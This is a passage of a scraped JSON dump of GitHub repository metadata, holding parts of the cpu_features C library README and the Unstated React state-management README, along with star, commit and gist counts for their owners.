\"cpuinfo_arm.h\"\n\nstatic const ArmFeatures features = GetArmInfo().features;\nstatic const bool has_aes_and_neon = features.aes && features.neon;\n\n// use has_aes_and_neon.\n```\n\nThis is a good approach to take if you're checking for combinations of features\nwhen using a compiler that is slow to extract individual bits from bit-packed\nstructures.\n\n### Checking compile time flags\n\nThe following code determines whether the compiler was told to use the AVX\ninstruction set (e.g., `g++ -mavx`) and sets `has_avx` accordingly.\n\n```c\n#include <stdbool.h>\n#include \"cpuinfo_x86.h\"\n\nstatic const X86Features features = GetX86Info().features;\nstatic const bool has_avx = CPU_FEATURES_COMPILED_X86_AVX || features.avx;\n\n// use has_avx.\n```\n\n`CPU_FEATURES_COMPILED_X86_AVX` is set to 1 if the compiler was instructed to\nuse AVX and 0 otherwise, combining compile time and runtime knowledge.\n\n### Rejecting poor hardware implementations based on microarchitecture\n\nOn x86, the first incarnation of a feature in a microarchitecture might not be\nthe most efficient (e.g. AVX on Sandy Bridge). We provide a function to retrieve\nthe underlying microarchitecture so you can decide whether to use it.\n\nBelow, `has_fast_avx` is set to 1 if the CPU supports the AVX instruction\nset&mdash;but only if it's not Sandy Bridge.\n\n```c\n#include <stdbool.h>\n#include \"cpuinfo_x86.h\"\n\nstatic const X86Info info = GetX86Info();\nstatic const X86Microarchitecture uarch = GetX86Microarchitecture(&info);\nstatic const bool has_fast_avx = info.features.avx && uarch != INTEL_SNB;\n\n// use has_fast_avx.\n```\n\nThis feature is currently available only for x86 microarchitectures.\n\n<a name=\"usagesample\"></a>\n### Running sample code\n\nBuilding `cpu_features` brings a small executable to test the library.\n\n```shell\n % ./build/list_cpu_features\narch            : x86\nbrand           :        Intel(R) Xeon(R) CPU E5-1650 0 @ 3.20GHz\nfamily          :   6 (0x06)\nmodel           :  45 (0x2D)\nstepping        :   7 (0x07)\nuarch           : INTEL_SNB\nflags           : aes, avx, sse4_1, sse4_2, ssse3\n```\n\n<a name=\"support\"></a>\n## What's supported\n\n|         | x86³ |   ARM   | AArch64 | MIPSel |  POWER  |\n|---------|:----:|:-------:|:-------:|:------:|:-------:|\n| Android | yes² |   yes¹  |   yes¹  |  yes¹  |   N/A   |\n| iOS     |  N/A | not yet | not yet |   N/A  |   N/A   |\n| Linux   | yes² |   yes¹  |   yes¹  |  yes¹  | not yet |\n| MacOs   | yes² |   N/A   | not yet |   N/A  |    no   |\n| Windows | yes² | not yet | not yet |   N/A  |   N/A   |\n\n1.  **Features revealed from Linux.** We gather data from several sources\n    depending on availability:\n    +   from glibc's\n        [getauxval](https://www.gnu.org/software/libc/manual/html_node/Auxiliary-Vector.html)\n    +   by parsing `/proc/self/auxv`\n    +   by parsing `/proc/cpuinfo`\n2.  **Features revealed from CPU.** features are retrieved by using the `cpuid`\n    instruction.\n3.  **Microarchitecture detection.** On x86 some features are not always\n    implemented efficiently in hardware (e.g. AVX on Sandybridge). Exposing the\n    microarchitecture allows the client to reject particular microarchitectures.\n\n\n<a name=\"license\"></a>\n## License\n\nThe cpu_features library is licensed under the terms of the Apache license.\nSee [LICENSE](LICENSE) for more information.\n\n<a name=\"cmake\"></a>\n## Build with CMake\n\nPlease check the [CMake build instructions](cmake/README.md).\n","byteSize":5570},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":1073},"createdAt":"2018-01-31T13:44:50Z","updatedAt":"2018-02-17T04:03:33Z","pushedAt":"2018-02-16T16:12:06Z","description":"A cross platform C99 library to get cpu features at runtime.","subscribersCount":{"totalCount":2497},"diskUsage":95,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":2},"pullRequestsMerged":{"totalCount":5},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"commits":{"totalCount":12}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":14}}}]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":14},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":5},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":12},"participants":{"totalCount":7}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":52}}},"tags":{"totalCount":1},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"jamiebuilds","followers":{"totalCount":3774},"repositories":{"totalCount":550},"following":{"totalCount":11},"location":null,"organizations":{"totalCount":17},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":14}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":34}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}}],"totalCount":108},"websiteUrl":"https://jamie.build/"},"repository":{"name":"unstated","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":false,"forkCount":44,"readme_md":{"text":"<div align=\"center\">\n  <br><br><br><br><br>\n  <img src=\"https://raw.githubusercontent.com/thejameskyle/unstated/master/logo.png\" alt=\"Unstated Logo\" width=\"400\">\n  <br><br><br><br><br><br><br><br>\n</div>\n\n# Unstated\n\n> State so simple, it goes without saying\n\n## Installation\n\n```sh\nyarn add unstated\n```\n\n## Example\n\n```js\nimport React from 'react';\nimport { render } from 'react-dom';\nimport { Subscribe, Container } from 'unstated';\n\ntype CounterState = {\n  count: number\n};\n\nclass CounterContainer extends Container<CounterState> {\n  state = {\n    count: 0\n  };\n\n  increment() {\n    this.setState({ count: this.state.count + 1 });\n  }\n\n  decrement() {\n    this.setState({ count: this.state.count - 1 });\n  }\n}\n\nfunction Counter() {\n  return (\n    <Subscribe to={[CounterContainer]}>\n      {counter => (\n        <div>\n          <button onClick={() => counter.decrement()}>-</button>\n          <span>{counter.state.count}</span>\n          <button onClick={() => counter.increment()}>+</button>\n        </div>\n      )}\n    </Subscribe>\n  );\n}\n\nrender(<Counter />, document.getElementById('root'));\n```\n\nFor more examples, see the `example/` directory.\n\n## Guide\n\nIf you're like me, you're sick of all the ceremony around state management in\nReact. Something that fits in well with the React way of thinking, but doesn't\ncommand some crazy architecture and methodology.\n\nComponent state is nice! It makes sense and people pick it up quickly:\n\n```js\nclass Counter extends React.Component {\n  state = { count: 0 };\n  increment = () => {\n    this.setState({ count: this.state.count + 1 });\n  };\n  decrement = () => {\n    this.setState({ count: this.state.count - 1 });\n  };\n  render() {\n    return (\n      <div>\n        <span>{this.state.count}</span>\n        <button onClick={this.decrement}>-</button>\n        <button onClick={this.increment}>+</button>\n      </div>\n    );\n  }\n}\n```\n\nAs a new React developer you might not know exactly how everything works, but\nyou can get a general sense pretty quickly.\n\nThe only problem here is that we can't easily share this state with other\ncomponents in our tree. Which is intentional! React components are designed to\nbe very self-contained.\n\nWhat would be great is if we could replicate the nice parts of React's\ncomponent state API while sharing it across multiple components.\n\nBut how do we share values between components in React? Through \"context\".\n\n> **Note:** The following is part of the new `React.createContext` API\n> [described in this RFC](https://github.com/reactjs/rfcs/blob/master/text/0002-new-version-of-context.md).\n\n```js\nconst Amount = React.createContext(1);\n\nclass Counter extends React.Component {\n  state = { count: 0 };\n  increment = amount => { this.setState({ count: this.state.count + amount }); };\n  decrement = amount => { this.setState({ count: this.state.count - amount }); };\n  render() {\n    return (\n      <Amount.Consumer>\n        {amount => (\n          <div>\n            <span>{this.state.count}</span>\n            <button onClick={() => this.decrement(amount)}>-</button>\n            <button onClick={() => this.increment(amount)}>+</button>\n          </div>\n        )}\n      </Amount.Consumer>\n    );\n  }\n}\n\nclass AmountAdjuster extends React.Component {\n  state = { amount: 0 };\n  handleChange = event => {\n    this.setState({\n      amount: parseInt(event.currentTarget.value, 10)\n    });\n  };\n  render() {\n    return (\n      <Amount.Provider value={this.state.amount}>\n        <div>\n          {this.props.children}\n          <input type=\"number\" value={this.state.amount} onChange={this.handleChange}/>\n        </div>\n      </Amount.Provider>\n    );\n  }\n}\n\nrender(\n  <AmountAdjuster>\n    <Counter/>\n  </AmountAdjuser>\n);\n```\n\nThis is already pretty great. Once you get a little bit used to React's way of\nthinking, it makes total sense and it's very predictable.\n\nBut can we build on this pattern to make something even nicer?\n\n### Introducing Unstated\n\nWell this is where Unstated comes in.\n\nUnstated is designed to build on top of the patterns already set out by React\ncomponents and context.\n\nIt has three pieces:\n\n##### `Container`\n\nWe're going to want another place to store our state and some of the logic for\nupdating it.\n\n`Container` is a very simple class which is meant to look just like\n`React.Component` but with only the state-related bits: `this.state` and\n`this.setState`.\n\n```js\nclass CounterContainer extends Container {\n  state = { count: 0 };\n  increment = () => {\n    this.setState({ count: this.state.count + 1 });\n  };\n  decrement = () => {\n    this.setState({ count: this.state.count - 1 });\n  };\n}\n```\n\nBehind the scenes our `Container`s are also event emitters that our app can\nsubscribe to for updates. When you call `setState` it triggers components to\nre-render, be careful not to mutate `this.state` directly or your components\nwon't re-render.\n\n##### `<Subscribe>`\n\nNext we'll need a piece to introduce our state back into the tree so that:\n\n* When state changes, our components re-render.\n* We can depend on our container's state.\n* We can call methods on our container.\n\nFor this we have the `<Subscribe>` component which allows us to pass our\ncontainer classes and receive instances of them in the tree.\n\n```js\nfunction Counter() {\n  return (\n    <Subscribe to={[CounterContainer]}>\n      {counter => (\n        <div>\n          <span>{counter.state.count}</span>\n          <button onClick={counter.decrement}>-</button>\n          <button onClick={counter.increment}>+</button>\n        </div>\n      )}\n    </Subscribe>\n  );\n}\n```\n\n`<Subscribe>` will automatically construct our container and listen for changes.\n\n##### `<Provider>`\n\nThe final piece that we'll need is something to store all of our instances\ninternally. For this we have `<Provider>`.\n\n```js\nrender(\n  <Provider>\n    <Counter />\n  </Provider>\n);\n```\n\nWe can do some interesting things with `<Provider>` as well like dependency\ninjection:\n\n```js\nlet counter = new CounterContainer();\n\nrender(\n  <Provider inject={[counter]}>\n    <Counter />\n  </Provider>\n);\n```\n\n### Testing\n\nWhenever we consider the way that we write the state in our apps we should be\nthinking about testing.\n\nWe want to make sure that our state containers have a clean way\n\nWell because our containers are very simple classes, we can construct them in\ntests and assert different things about them very easily.\n\n```js\ntest('counter', () => {\n  let counter = new CounterContainer();\n  assert(counter.state.count === 0);\n\n  counter.increment();\n  assert(counter.state.count === 1);\n\n  counter.decrement();\n  assert(counter.state.count === 0);\n});\n```\n\nIf we want to test the relationship between our container and the component\nwe can again construct our own instance and inject it into the tree.\n\n```js\ntest('counter', () => {\n  let counter = new CounterContainer();\n  let tree = render(\n    <Provider inject={[counter]}>\n      <Counter />\n    </Provider>\n  );\n\n  click(tree, '#increment');\n  assert(counter.state.count === 1);\n\n  click(tree, '#decrement');\n  assert(counter.state.count === 0);\n});\n```\n\nDependency injection is useful in many ways. Like if we wanted to stub out a\nmethod in our state container we can do that painlessly.\n\n```js\ntest('counter', () => {\n  let counter = new CounterContainer();\n  let inc = stub(counter, 'increment');\n  let dec = stub(counter, 'decrement');\n\n  let tree = render(\n    <Provider inject={[counter]}>\n      <Counter />\n    </Provider>\n  );\n\n  click(tree, '#increment');\n  assert(inc.calls.length === 1);\n  assert(dec.calls.length === 0);\n});\n```\n\nWe don't even have to do anything to clean up after ourselves because we just\nthrow everything out afterwards.\n\n## FAQ\n\n#### What state should I put into Unstated?\n\nThe React community has focused a lot on trying to put all their state in one\nplace. You could keep doing that with Unstated, but I wouldn't recommend it.\n\nI would recommend a multi-part solution.\n\nFirst, use local component state as much as you possibly can. That counter\nexample from above never should have been refactored away from component\nstate, it was fine before Unstated.\n\nSecond, use libraries to abstract away the bits of state that you'll repeat\nover and over.\n\nLike if form state has you down, you might want to use a library like\n[Final Form](https://github.com/final-form/react-final-form).\n\nIf fetching data is getting to be too much, maybe try out [Apollo](https://www.apollographql.com).\nOr even something uncool but familiar and reliable like [Backbone models and collections](http://backbonejs.org).\nWhat? Are you too cool to use an old framework?\n\nThird, a lot of shared state between components is localized to a few\ncomponents in the tree.\n\n```js\n<Tabs>\n  <Tab>One</Tab>\n  <Tab>Two</Tab>\n  <Tab>Three</Tab>\n</Tabs>\n```\n\nFor this, I recommend using React's built-in `React.createContext()` API\nand being careful in designing the API for the base components you create.\n\n> **Note:** If you're on an old version of React and want to use the new\n> context API, [I've got you](https://github.com/thejameskyle/create-react-context/)\n\nFinally, (and only after other things are exhausted), if you really need\nsome global state to be shared throughout your app, you can use Unstated.\n\nI know all of this might sound somehow more complicated, but it's a\nmatter of using the right tool for the job and not forcing a single\nparadigm on the entire universe.\n\nUnstated isn't ambitious, use it as you need it, it's nice and small for\nthat reason. Don't think of it as a \"Redux killer\". Don't go trying to\nbuild complex tools on top of it. Don't reinvent the wheel. Just try it\nout and see how you like it. \n","byteSize":9620},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":1677},"createdAt":"2018-01-31T13:56:02Z","updatedAt":"2018-02-17T08:30:19Z","pushedAt":"2018-02-13T06:31:13Z","description":"State so simple, it goes without saying","subscribersCount":{"totalCount":34},"diskUsage":185,"pullRequestsOpen":{"totalCount":3},"pullRequestsClosed":{"totalCount":3},"pullRequestsMerged":{"totalCount":9},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":34}}},"tags":{"totalCount":4},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"mattjj","followers":{"totalCount":364},"repositories":{"totalCount":69},"following":{"totalCount":86},"location":"San Francisco","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"